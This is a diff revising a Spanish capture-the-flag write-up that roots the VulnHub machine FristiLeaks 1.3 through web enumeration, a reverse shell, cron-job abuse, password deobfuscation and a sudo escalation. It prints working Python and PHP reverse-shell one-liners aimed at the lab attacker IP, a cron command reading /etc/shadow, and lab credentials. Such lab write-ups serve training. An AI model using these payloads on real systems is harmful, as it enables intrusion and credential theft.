@@ -1,11 +1,58 @@
-> Para esta máquina hay que hacer cambios para obtener IP, estos cambios recaen en modificar el archivo .vmx de la máquina virtual creada.
-> En este caso, agregar la linea:
-> 	ethernet0.address = "08:00:27:A5:A6:76"
-> Y cambiar la linea:
-> 	ethernet0.addressType = "generated"
-> por esta otra:
-> 	ethernet0.addressType = "static"
+# FristiLeaks: 1.3 (VulnHub - Basic) WriteUp Español
 
+[🦔](#PreRequerimientos) #PreRequerimientos
+- Edición de `vmx`, parámetros `ethernet0.address` y `ethernet0.addressType`.
+
+[🦔](#Reconocimiento) #Reconocimiento
+- Escaneo usual (IP, TTL, Puertos, Versiones y Servicios, Launchpad).
+
+[🦔](#VulnGathering) #VulnGathering
+- Enumeración de directorios + diccionario personalizado.
+
+[🦔](#Engaño) #Engaño
+- Decodificación de contraseña en imagen codificada en base 64.
+
+[🦔](#Explotación) #Explotación
+- Obtención de reverse shell, con acceso al sistema, bajo usuario de bajos privilegios.
+
+[🦔](#GanarControl) #GanarControl
+- Abuso de permisos, para modificación de tarea cronjob.
+- Decodificación de contraseñas ofuscadas usando python.
+- Escalación lateral.
+
+[🦔](#Resultados-PoC) #Resultados-PoC
+
+
+_Presiona al erizo para dirigirte al contenido._
+### PreRequerimientos
+Este documento son resultados y hallazgos obtenidos en una emulación de escenario de *prueba de penetración* en una modalidad de caja Gris.
+
+La intención de la metodología usada es para presentar el reporte por *escenarios de riesgo*, mientras se obtiene el goal de la máquina objetivo. véase [[Metodología]]
+#### Sobre la máquina
+```http
+Nombre: Fristileaks 1.3
+Autor: Ar0xA
+Goal: get root (uid 0) and read the flag file
+Dificultad: Basic
+Descargado de: https://download.vulnhub.com/fristileaks/FristiLeaks_1.3.ova
+```
+
+Desde una conexión de red interna, se el escenario de pruebas se compone de:
+> IP Atacante: 192.168.0.21
+
+> IP Víctima:   192.168.0.70
+
+#### Consideraciones adicionales
+Para esta máquina se realizaron cambios para obtener IP, estos cambios recaen en modificar el archivo .vmx de la máquina virtual creada.
+En este caso, agregar la linea:
+	ethernet0.address = "08:00:27:A5:A6:76"
+Y cambiar la linea:
+	ethernet0.addressType = "generated"
+Por esta otra:
+	ethernet0.addressType = "static"
+
+<small>Durante el reporte se utiliza '[...]' para omitir partes que no serán de interés en el proceso de penetración.</small>
+## Reconocimiento
 Hacemos el reconocimiento, donde de entrada tenemos la dirección MAC:
 ```python
 $sudo arp-scan -I wlp2s0 --localnet | grep "08:00:27:a5:a6:76"
@@ -39,15 +86,15 @@ Tenemos:
 1. Versión antigua de apache y php
 2. Método TRACE, no usado últimamente por su potencial inseguro
 3. Tres entradas no permitidas para indexar.
-
+## VulnGathering
 Podemos indagar un poco en estos 3 hallazgos:
 1 - Buscando exploits para versiones antiguas:
 En los primeros resultados, parece haber algo que calza bien a las tecnologías usadas e inicio para un nuevo vector de ataque:
 ```python
 $searchsploit Apache 2.2.15
-------------------------------------------------- -------------------------------
+------------------------------------------------- -------------------------
  Exploit Title                                   |  Path
-------------------------------------------------- -------------------------------
+------------------------------------------------- -------------------------
 Apache + PHP < 5.3.12 / < 5.4.2 - cgi-bin Remote | php/remote/29290.c
 Apache + PHP < 5.3.12 / < 5.4.2 - Remote Code Ex | php/remote/29316.py
 [...]
@@ -80,7 +127,8 @@ HTTP/1.1 301 Moved Permanently
 </body></html>
 ```
 
-```
+Se procedió con esta información usar un exploit:
+```python
 $searchsploit -m php/remote/29316.py
   Exploit: Apache + PHP < 5.3.12 / < 5.4.2 - Remote Code Execution + Scanner
       URL: https://www.exploit-db.com/exploits/29316
@@ -90,17 +138,17 @@ $searchsploit -m php/remote/29316.py
 File Type: Python script, ASCII text executable
 Copied to: /home/kmxbay/Documentos/VulnHub/FristiLeaks/29316.py
 ```
-
-```
+Más no se obtuvo resultado satisfactorio:
+```python
 $python2 29316.py -h http://192.168.0.70/ -c 'ls' -v
 --==[ ap-unlock-v1337.py by noptrix@nullsecurity.net ]==--
 [+] s3nd1ng c0mm4ndz t0 h0st http://192.168.0.70/ 
 -> c0uld n0t c0nn3ct t0 http://192.168.0.70/
 [+] h0p3 1t h3lp3d
-
 ```
 
-```
+Se realizó un escaneo de directorios
+```python
 $dirb http://192.168.0.70
 [...]                                                        
 ---- Scanning URL: http://192.168.0.70/ ----
@@ -112,7 +160,7 @@ $dirb http://192.168.0.70
 
 Hicimos un diccionario personalizado con `$cewl http://192.168.0.70 -w dict_index.txt`
 Pero no funcionó mucho:
-```
+```python
 $dirb http://192.168.0.70 dict_index.txt 
 [...]
 
@@ -127,7 +175,7 @@ GENERATED WORDS: 49
 ---- Scanning URL: http://192.168.0.70/ ----
 ```
 
-Haciendo reconocimiento web, llegamos a que es valido el directorio /fristi, de hecho es un login. Se hacia referencia de esto en la imagen del index: _Keep Calm And Drink Fristi_.
+Haciendo reconocimiento web, llegamos a que es valido el directorio `/fristi`, de hecho es un login. Se hacia referencia de esto en la imagen del index: _Keep Calm And Drink Fristi_.
 
 No se puede hacer mucho hasta que se revisa el código fuente, donde hay varias pistas:
 ```python
@@ -142,8 +190,8 @@ We need to clean this up for production. I left some junk in here to make testin
 
 También una imagen cuyo link está codificado: `data:img/png;base64,/9j/4AAQSkZJRgABAgAAZABkAA...`
 
-Y un comentario también codificado, cuando se decodifica en base 64 no da un texto claro, sólo se puede ver una cadena como `PNG`
-
+Y un comentario también codificado, cuando se decodifica en base 64 no da un texto claro, sólo se puede ver una cadena como `PNG`.
+## Engaño
 Hubo intentos de SQLi que no funcionaron como:
 ```python
 Username: eezeepz
@@ -159,7 +207,7 @@ La imagen da un texto en fondo blanco con contenido:
 ```js
 keKkeKKeKKeKkEkkEk
 ```
-
+## Explotación
 Con esto obtenemos la siguiente respuesta:
 ```html
 Login successful<p>
@@ -175,7 +223,7 @@ $nc -lvnp 9001
 script /dev/null -c bash
 bash-4.1$ 
 ```
-
+## GanarControl
 sobre los usuario con bash, vemos lo siguiente:
 ```python
 bash-4.1$ cat /etc/passwd | grep /bash                                          
@@ -218,7 +266,6 @@ run every minute with my account privileges.
 ```
 
 Buscando más archivos `.txt` encontramos en `/var/www` que jerry está muy al pendiente de eezeepz:
-
 ```js
 bash-4.1$ cat /var/www/notes.txt
 hey eezeepz your homedir is a mess, go clean it up, just dont delete
@@ -251,16 +298,10 @@ ps
 whoisyourgodnow.txt
 ```
 
-echo "" > /tmp/runthis
-
-echo "/home/admin/mv /home/admin/egrep /home/admin/igrep && cp /tmp/my_img /home/admin/egrep " > /tmp/runthis
-
-
-
 Nos metemos a la ruta `/tmp` y ejecutamos comandos,  los vemos en el `cronresult`, por ejemplo viendo los archivos `.txt`, obtuvimos estas contraseñas ofuscadas: `=RFn0AKnlMHMPIzpyuTI0ITG` y `mVGZ3O3omkJLmy2pcuTq`.
 
 Esta es la parte de `cronresult` donde obtenemos el código que ofusca contraseñas y el contenido de `/usr/bin` (este ultimo lo recorte por comandos que se pudieran aprovechar): 
-```
+```python
 executing: /home/admin/cat cryptpass.py && /home/admin/cat whoisyourgodnow.txt && /home/admin/cat cryptedpass.txt && ls /usr/bin 
 #Enhanced with thanks to Dinesh Singh Sikawar @LinkedIn
 import base64,codecs,sys
@@ -287,22 +328,16 @@ python2.6
 wget
 ```
 
-python -c 'import pty; pty.spawn("/bin/bash")'
-
-
-El mensaje hace énfasis en que se eescriba la ruta completa, en algunas pruebas dice esto:
-```
+En uno de los intentos de escalación, se encontró esta restricción:
+```python
 command did not start with /home/admin or /usr/bin
 command did not start with /home/admin or /usr/bin
 command did not start with /home/admin or /usr/bin
 [...]
 ```
 
-
-
-Dado que sabemos lo que hace el script que trato las contraseñas encontradas en los archivos `.txt`, podemos obtenerla en texto claro.
+Dado el contenido del script que ofuscó las contraseñas encontradas en los archivos `.txt`, podemos obtenerla en texto claro.
 La contraseña escondida en `whoisyourgodnow.txt` la desofuscamos de la siguiente forma:
-
 ```python
 $python3
 Python 3.11.2 (main, Apr 28 2025, 14:11:48) [GCC 12.2.0] on linux
@@ -320,36 +355,8 @@ LetThereBeFristi!
 Como obtuvimos dos contraseñas ofuscadas, volvimos a aplicar este proceso. 
 La contraseña escondida en `cryptedpass.txt` resulto ser `thisisalsopw123`
 
-```python
-/usr/bin/python -c '
-import socket,subprocess,os;
-s=socket.socket();
-s.connect(("192.168.0.21",7777));
-os.dup2(s.fileno(),0);
-os.dup2(s.fileno(),1);
-os.dup2(s.fileno(),2);
-p=subprocess.call(["/bin/sh"])
-'
-
-
-/usr/bin/python2 -c '
-import socket,subprocess,os;
-s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);
-s.connect(("192.168.0.21",7777));
-os.dup2(s.fileno(),0);
-os.dup2(s.fileno(),1);
-os.dup2(s.fileno(),2);
-import pty; pty.spawn("sh")
-'
-
-export RHOST="192.168.0.21" && export RPORT=7777 && /usr/bin/python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("sh")'
-
-
-echo "/home/admin/cat /etc/shadow" > /tmp/runthis
-/usr/bin/php -r '$sock=fsockopen("192.168.0.21",7777);passthru("sh <&3 >&3 2>&3");'
-```
-
-
+La shell no permitía cambiar el usuario, pero dentro de los intentos. se volvió a abordar la máquina con la misma revshell y pudimos obtener la autenticación:
+```bash
 su admin
 Password: thisisalsopw123
 
@@ -366,10 +373,13 @@ Administrator. It usually boils down to these three things:
 [sudo] password for admin: thisisalsopw123
 
 Sorry, user admin may not run sudo on localhost.
+[admin@localhost tmp]$
+```
+Después avanzamos en la escalación lateral para el usuario `fristigod`:
+```bash
 [admin@localhost tmp]$ su fristigod
 su fristigod
 Password: LetThereBeFristi!
-
 bash-4.1$ whoami
 whoami
 fristigod
@@ -388,11 +398,16 @@ Matching Defaults entries for fristigod on this host:
 
 User fristigod may run the following commands on this host:
     (fristi : ALL) /var/fristigod/.secret_admin_stuff/doCom
+```
 
-sudo -u fristi /var/fristigod/.secret_admin_stuff/doCom
-sudo -u fristi /var/fristigod/.secret_admin_stuff/doCom id
+Con esto se encontró la forma de ejecutar comandos, de la forma `sudo -u fristi /var/fristigod/.secret_admin_stuff/doCom id`
+
+## Resultados-PoC
+Para obtener una shell con el binario por abuso de sudo, fue de la siguiente forma:
+```bash
 sudo -u fristi /var/fristigod/.secret_admin_stuff/doCom /bin/sh
 sh-4.1# whoami
 whoami
 root
-sh-4.1# 
+sh-4.1#
+```
